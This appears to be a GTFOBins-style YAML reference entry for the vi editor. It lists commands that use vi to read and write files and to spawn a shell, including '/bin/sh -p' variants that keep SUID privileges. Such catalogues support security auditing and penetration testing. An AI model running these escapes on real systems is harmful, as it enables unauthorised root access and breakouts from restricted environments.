---
functions:
  file-read:
  - code: |-
      vi /path/to/input-file
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - code: |-
      vi /path/to/output-file
      iDATA
      ^[
      w
    comment: |-
      Where `^[` is the escape key.
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      vi -c ':!/bin/sh' /dev/null
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
  - code: |-
      vi -c ':shell'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
  - code: |-
      vi -c ':set shell=/bin/sh | shell'
    contexts:
      sudo:
      suid:
        code: |-
          vi -c ':set shell=/bin/sh\ -p | shell'
        shell: false
      unprivileged:
  - code: |-
      vi -c :terminal /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          vi -c ':terminal /bin/sh -p'
        shell: false
      unprivileged:
...
